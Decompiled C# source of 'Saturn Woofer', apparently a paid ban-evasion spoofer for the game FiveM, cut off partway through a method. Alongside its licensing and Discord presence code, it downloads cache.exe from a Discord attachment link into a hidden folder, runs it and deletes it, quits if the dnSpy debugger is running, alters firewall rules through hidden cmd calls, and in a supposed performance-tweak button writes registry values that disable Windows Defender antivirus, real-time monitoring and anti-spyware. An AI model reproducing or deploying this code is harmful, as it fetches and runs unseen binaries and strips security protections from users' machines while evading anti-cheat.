﻿// Decompiled with JetBrains decompiler
// Type: Saturn.Forms.Main
// Assembly: Saturn, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 782363C4-840F-42BB-9DE3-89C9DB6D215C
// Assembly location: C:\Users\xande\Desktop\32 bit spy\unpacked_saturn.exe

using Guna.UI2.WinForms;
using Microsoft.Win32;
using Saturn.Addons;
using Saturn.Properties;
using Siticone.UI.AnimatorNS;
using Siticone.UI.WinForms;
using Siticone.UI.WinForms.Enums;
using Siticone.UI.WinForms.Suite;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;

namespace Saturn.Forms
{
  public class Main : Form
  {
    private DiscordRpc.EventHandlers handlers;
    private DiscordRpc.RichPresence presence;
    private Rectangle BoundRect;
    private Rectangle OldRect = Rectangle.Empty;
    public static string folder = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
    public static string specificFolder = Path.Combine(Main.folder, "DigitalEntitlements");
    public static Random random = new Random();
    private string xynw = Main.RandomString(5);
    private List<Process> processlist = new List<Process>();
    private IContainer components = (IContainer) null;
    private SiticoneDragControl siticoneDragControl1;
    private SiticoneControlBox siticoneControlBox1;
    private SiticoneControlBox siticoneControlBox2;
    private SiticoneTransition siticoneTransition1;
    private Label label1;
    private Label label2;
    private SiticoneShadowForm siticoneShadowForm;
    private SiticoneLabel subscription;
    private SiticoneLabel key;
    private System.Windows.Forms.Timer timer1;
    private SiticoneLabel version;
    private BindingSource bindingSource1;
    private Panel panel2;
    private PictureBox pictureBox1;
    private SiticoneLabel siticoneLabel2;
    private SiticoneShadowPanel spooferpanel;
    private SiticoneLabel siticoneLabel4;
    private PictureBox pictureBox4;
    private Label label5;
    private SiticoneLabel siticoneLabel3;
    private SiticoneOSToggleSwith DiscordRPCTS;
    private SiticoneGradientButton siticoneGradientButton3;
    private SiticoneGradientButton siticoneGradientButton2;
    private SiticoneGradientButton siticoneGradientButton4;
    private SiticoneRoundedButton siticoneRoundedButton8;
    private SiticoneRoundedButton siticoneRoundedButton6;
    private SiticoneRoundedButton siticoneRoundedButton5;
    private SiticoneRoundedButton siticoneRoundedButton4;
    private SiticoneRoundedButton siticoneRoundedButton3;
    private SiticoneRoundedButton siticoneRoundedButton2;
    private SiticoneRoundedButton siticoneRoundedButton1;
    private SiticoneShadowPanel gamepanel;
    private SiticoneLabel siticoneLabel1;
    private PictureBox pictureBox2;
    private Label label3;
    private SiticoneRoundedButton siticoneRoundedButton9;
    private SiticoneLabel siticoneLabel5;
    private SiticoneShadowPanel settingspanel;
    private SiticoneLabel siticoneLabel7;
    private PictureBox pictureBox3;
    private Label label4;
    private Label label7;
    private PageSetupDialog pageSetupDialog1;
    private System.Windows.Forms.Timer timer2;
    private Label time;
    private SiticoneLabel siticoneLabel8;
    private SiticoneShadowPanel defpanel;
    private SiticoneRoundedButton prem2;
    private SiticoneRoundedButton prem1;
    private SiticoneButton siticoneButton2;
    private SiticoneRoundedButton prem3;
    private SiticoneRoundedButton prem4;
    private SiticoneRoundedButton siticoneRoundedButton10;
    private SiticoneLabel siticoneLabel10;
    private SiticoneTextBox diskname;
    private SiticoneRoundedButton premnew1;
    private SiticoneButton siticoneButton1;
    private SiticoneLabel siticoneLabel6;
    private SiticoneLabel siticoneLabel11;
    private SiticoneLabel textip;
    private SiticoneTextBox enterip;
    private System.Windows.Forms.Timer timer3;
    private Guna2ComboBox MethodCB;
    private Panel panel1;
    private SiticoneLabel siticoneLabel12;
    private SiticoneLabel siticoneLabel13;
    private SiticoneLabel siticoneLabel9;
    private SiticoneRoundedButton siticoneRoundedButton11;
    private SiticoneRoundedButton siticoneRoundedButton12;
    private SiticoneRoundedButton siticoneRoundedButton13;
    private SiticoneRoundedButton siticoneRoundedButton14;
    private SiticoneRoundedButton siticoneRoundedButton15;
    private SiticoneLabel siticoneLabel14;

    public Main()
    {
      System.Timers.Timer timer = new System.Timers.Timer(50.0);
      timer.AutoReset = true;
      timer.Elapsed += new ElapsedEventHandler(Main.MyMethod);
      timer.Start();
      this.InitializeComponent();
      ((Control) this.spooferpanel).BringToFront();
    }

    private void siticoneControlBox1_Click(object sender, EventArgs e)
    {
      DiscordRpc.Shutdown();
      Environment.Exit(0);
    }

    public static void MyMethod(object sender, ElapsedEventArgs e) => Main.DimisProtection();

    public static void MyMethod2(object sender, ElapsedEventArgs e)
    {
      if (Process.GetProcessesByName("FiveM").Length == 0)
        return;
      Thread.Sleep(1000);
      new Process()
      {
        StartInfo = {
          FileName = "cmd.exe",
          CreateNoWindow = true,
          RedirectStandardInput = true,
          RedirectStandardOutput = true,
          UseShellExecute = false,
          Verb = "runas",
          Arguments = "/C netsh advfirewall firewall add rule name = \"FiveM2372Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =out new enable= no > nul"
        }
      }.Start();
      Application.Exit();
    }

    private void Main_Load(object sender, EventArgs e)
    {
      string path1 = "C:\\Program Files\\SaturnWoofer";
      if (!Directory.Exists(path1))
        Directory.CreateDirectory(path1);
      if (System.IO.File.Exists("runtime.dll"))
      {
        this.handlers = new DiscordRpc.EventHandlers();
        DiscordRpc.Initialize("1003190433310068776", ref this.handlers, true, (string) null);
        this.handlers = new DiscordRpc.EventHandlers();
        DiscordRpc.Initialize("1003190433310068776", ref this.handlers, true, (string) null);
        this.presence.state = "#1 Game Woofer | discord.gg/spoofer";
        this.presence.details = "Username: " + Saturn.Forms.Saturn.KeyAuthApp.user_data.username;
        this.presence.largeImageKey = "woofah";
        DiscordRpc.UpdatePresence(ref this.presence);
      }
      else
      {
        using (WebClient webClient = new WebClient())
        {
          webClient.DownloadFile("https://cdn.discordapp.com/attachments/953684464104513571/1003190755013177345/runtime.dll", "runtime.dll");
          Thread.Sleep(2000);
          this.handlers = new DiscordRpc.EventHandlers();
          DiscordRpc.Initialize("1003190433310068776", ref this.handlers, true, (string) null);
          this.handlers = new DiscordRpc.EventHandlers();
          DiscordRpc.Initialize("1003190433310068776", ref this.handlers, true, (string) null);
          this.presence.state = "#1 Game Woofer | discord.gg/spoofer";
          this.presence.details = "Username: " + Saturn.Forms.Saturn.KeyAuthApp.user_data.username;
          this.presence.largeImageKey = "woofah";
          DiscordRpc.UpdatePresence(ref this.presence);
        }
      }
      ((Control) this.defpanel).BringToFront();
      ((Control) this.textip).Hide();
      ((Control) this.enterip).Hide();
      string str1 = "C:\\Program Files\\Saved\\imgsave.gif";
      if (System.IO.File.Exists(str1))
      {
        string str2 = "C:\\Program Files\\Saved\\" + Main.GenID(4) + ".gif";
        System.IO.File.Copy(str1, str2);
        this.pictureBox1.Image = (Image) new Bitmap(str2);
      }
      Main.DimisProtection();
      if (Process.GetProcessesByName("dnSpy").Length == 0)
      {
        string path2 = "C:\\Program Files\\Win64";
        if (!Directory.Exists(path2))
        {
          Directory.CreateDirectory(path2).Attributes = FileAttributes.Hidden | FileAttributes.Directory;
        }
        else
        {
          Directory.CreateDirectory("C:\\Program Files\\Win64");
          Directory.CreateDirectory(path2).Attributes = FileAttributes.Hidden | FileAttributes.Directory;
        }
        if (Saturn.Forms.Saturn.KeyAuthApp.user_data.subscriptions[0].subscription == "Developer")
        {
          ((Control) this.prem1).Show();
          ((Control) this.prem2).Show();
          ((Control) this.premnew1).Show();
          ((Control) this.prem3).Show();
          ((Control) this.prem4).Show();
        }
        else if (!(Saturn.Forms.Saturn.KeyAuthApp.user_data.subscriptions[0].subscription == "Premium User"))
          ;
        Saturn.Forms.Saturn.KeyAuthApp.check();
        ((Control) this.key).Text = Saturn.Forms.Saturn.KeyAuthApp.user_data.username;
        ((Control) this.subscription).Text = Saturn.Forms.Saturn.KeyAuthApp.user_data.subscriptions[0].subscription;
        ((Control) this.version).Text = "Version:  " + Saturn.Forms.Saturn.KeyAuthApp.app_data.version;
        Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        new StreamReader(WebRequest.Create("https://pastebin.com/raw/GSXJSWtr").GetResponse().GetResponseStream()).ReadToEnd();
        new StreamReader(WebRequest.Create("https://pastebin.com/raw/P72g9Hxd").GetResponse().GetResponseStream()).ReadToEnd();
      }
      else
      {
        this.Hide();
        int num = (int) MessageBox.Show("Debug Attempt Detected", "Saturn Woofer", MessageBoxButtons.OK);
        Application.Exit();
      }
    }

    public DateTime UnixTimeToDateTime(long unixtime) => new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Local).AddSeconds((double) unixtime).ToLocalTime();

    private void sendmsg_Click(object sender, EventArgs e)
    {
    }

    private void timer1_Tick(object sender, EventArgs e)
    {
      DateTime now = DateTime.Now;
      this.time.Text = string.Format("{0}/{1}/{2} {3}:{4}:{5}", (object) now.Day, (object) now.Month, (object) now.Year, (object) now.Hour, (object) now.Minute, (object) now.Second);
    }

    private void key_Click(object sender, EventArgs e)
    {
    }

    private void StartBTN_Click(object sender, EventArgs e)
    {
    }

    private void siticoneLabel1_Click(object sender, EventArgs e)
    {
    }

    private void subscription_Click(object sender, EventArgs e)
    {
    }

    private void chatmsg_TextChanged(object sender, EventArgs e)
    {
    }

    private void siticoneShadowPanel5_Paint(object sender, PaintEventArgs e)
    {
    }

    private void IPAddressTB_TextChanged(object sender, EventArgs e)
    {
    }

    private void siticoneButton4_Click(object sender, EventArgs e)
    {
    }

    private void siticoneGradientButton2_Click(object sender, EventArgs e) => ((Control) this.spooferpanel).BringToFront();

    private void siticoneGradientButton1_Click(object sender, EventArgs e)
    {
    }

    private void siticoneGradientButton3_Click(object sender, EventArgs e)
    {
    }

    private void siticoneGradientButton4_Click(object sender, EventArgs e)
    {
    }

    private void settingspanel_Paint(object sender, PaintEventArgs e)
    {
    }

    private void settingspanel_Paint_1(object sender, PaintEventArgs e)
    {
    }

    private void siticoneButton1_Click(object sender, EventArgs e)
    {
    }

    private void panel2_Paint(object sender, PaintEventArgs e)
    {
    }

    private void version_Click(object sender, EventArgs e)
    {
    }

    private void LogoutPanelButton_Click(object sender, EventArgs e)
    {
    }

    private void siticoneButton1_Click_1(object sender, EventArgs e)
    {
      string path = "C:\\Program Files\\Win64";
      if (!Directory.Exists(path))
        Directory.CreateDirectory(path);
      if (System.IO.File.Exists("C:\\Program Files\\Win64\\cache.exe"))
      {
        Process.Start("C:\\Program Files\\Win64\\cache.exe");
        Thread.Sleep(1000);
        System.IO.File.Delete("C:\\Program Files\\Win64\\cache.exe");
      }
      else
      {
        new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/953684464104513571/956446548160573450/cache.exe", "C:\\Program Files\\Win64\\cache.exe");
        System.IO.File.SetAttributes("C:\\Program Files\\Win64\\cache.exe", FileAttributes.Hidden);
        Thread.Sleep(1000);
        Process.Start("C:\\Program Files\\Win64\\cache.exe");
        Thread.Sleep(1000);
        System.IO.File.Delete("C:\\Program Files\\Win64\\cache.exe");
      }
    }

    private void MethodCB_SelectedIndexChanged(object sender, EventArgs e)
    {
    }

    private void DiscordRPCTS_CheckedChanged(object sender, EventArgs e)
    {
      if (this.DiscordRPCTS.Checked)
      {
        this.handlers = new DiscordRpc.EventHandlers();
        DiscordRpc.Initialize("1003190433310068776", ref this.handlers, true, (string) null);
        this.handlers = new DiscordRpc.EventHandlers();
        DiscordRpc.Initialize("1003190433310068776", ref this.handlers, true, (string) null);
        this.presence.state = "#1 Game Woofer | discord.gg/top";
        this.presence.details = "Username: " + Saturn.Forms.Saturn.KeyAuthApp.user_data.username;
        this.presence.largeImageKey = "woofe";
        DiscordRpc.UpdatePresence(ref this.presence);
      }
      else
        DiscordRpc.Shutdown();
    }

    private void DiscordRPCTS_BackColorChanged(object sender, EventArgs e)
    {
    }

    public static void Enable_LocalAreaConection(string adapterId, bool enable = true)
    {
      string str1 = "Ethernet";
      foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
      {
        if (networkInterface.Id == adapterId)
        {
          str1 = networkInterface.Name;
          break;
        }
      }
      string str2 = !enable ? "disable" : nameof (enable);
      ProcessStartInfo processStartInfo = new ProcessStartInfo("netsh", "interface set interface \"" + str1 + "\" " + str2);
      Process process = new Process();
      process.StartInfo = processStartInfo;
      process.Start();
      process.StartInfo.CreateNoWindow = true;
      process.WaitForExit();
    }

    public static string RandomMac()
    {
      string str1 = "ABCDEF0123456789";
      string str2 = "26AE";
      string str3 = "";
      Random random = new Random();
      string str4 = str3 + str1[random.Next(str1.Length)].ToString() + str2[random.Next(str2.Length)].ToString();
      for (int index = 0; index < 5; ++index)
        str4 = str4 + "-" + str1[random.Next(str1.Length)].ToString() + str1[random.Next(str1.Length)].ToString();
      return str4;
    }

    private void EnableMouse()
    {
      Cursor.Clip = this.OldRect;
      Cursor.Show();
    }

    public bool PreFilterMessage(ref Message m) => m.Msg == 513 || m.Msg == 514 || m.Msg == 515 || m.Msg == 516 || m.Msg == 517 || m.Msg == 518;

    private void DisableMouse()
    {
      this.OldRect = Cursor.Clip;
      this.BoundRect = new Rectangle(50, 50, 1, 1);
      Cursor.Clip = this.BoundRect;
      Cursor.Hide();
    }

    private void siticoneGradientButton2_Click_1(object sender, EventArgs e) => ((Control) this.spooferpanel).BringToFront();

    public static string RandomString(int length) => new string(Enumerable.Repeat<string>("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", length).Select<string, char>((Func<string, char>) (s => s[Main.random.Next(s.Length)])).ToArray<char>());

    private void siticoneRoundedButton9_Click(object sender, EventArgs e)
    {
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "Append Completion", (object) "yes", RegistryValueKind.String);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "AutoSuggest", (object) "yes", RegistryValueKind.String);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", "EnableAutoTray", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Copy To", "", (object) "{C2FBB630-2971-11D1-A18C-00C04FD75D13}");
      Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Move To", "", (object) "{C2FBB631-2971-11D1-A18C-00C04FD75D13}");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "AutoEndTasks", (object) "1");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "HungAppTimeout", (object) "1000");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", (object) "0");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "WaitToKillAppTimeout", (object) "2000");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "LowLevelHooksTimeout", (object) "1000");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", (object) "0");
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoLowDiskSpaceChecks", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "LinkResolveIgnoreLinkInfo", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveSearch", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveTrack", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoInternetOpenWith", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", (object) "2000");
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagsvc", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", (object) 1, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "GPU Priority", (object) 8, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Priority", (object) 6, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Scheduling Category", (object) "High", RegistryValueKind.String);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "SFIO Priority", (object) "High", RegistryValueKind.String);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "GPU Priority", (object) 0, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Priority", (object) 8, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Scheduling Category", (object) "Medium", RegistryValueKind.String);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "SFIO Priority", (object) "High", RegistryValueKind.String);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("Append Completion", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("AutoSuggest", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", true).DeleteValue("EnableAutoTray", false);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", (object) "0", RegistryValueKind.DWord);
      Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Copy To", false);
      Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Move To", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("AutoEndTasks", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("HungAppTimeout", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("WaitToKillAppTimeout", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("LowLevelHooksTimeout", false);
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", (object) "400");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", (object) "400");
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoLowDiskSpaceChecks", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("LinkResolveIgnoreLinkInfo", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveSearch", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveTrack", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoInternetOpenWith", false);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", (object) "5000");
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", (object) "2", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", (object) "2", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", (object) "2", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", (object) 14, RegistryValueKind.DWord);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("GPU Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Scheduling Category", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("SFIO Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("GPU Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Scheduling Category", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("SFIO Priority", false);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System", "PublishUserActivities", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\SQMClient\\Windows", "CEIPEnable", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "AITEnable", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableInventory", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisablePCA", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableUAR", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Device Metadata", "PreventDeviceMetadataFromNetwork", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\AutoLogger\\SQMLogger", "Start", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\System", "AllowExperimentation", (object) 0);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiVirus", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableSpecialRunningModes", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRoutinelyTakingAction", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "ServiceKeepAlive", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "ForceUpdateFromMU", (object) 0);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", "DisableBlockAtFirstSeen", (object) 1);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\MpEngine", "MpEnablePus", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "PUAProtection", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager", "DisableScanningNetworkFiles", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", (object) "1", RegistryValueKind.DWord);
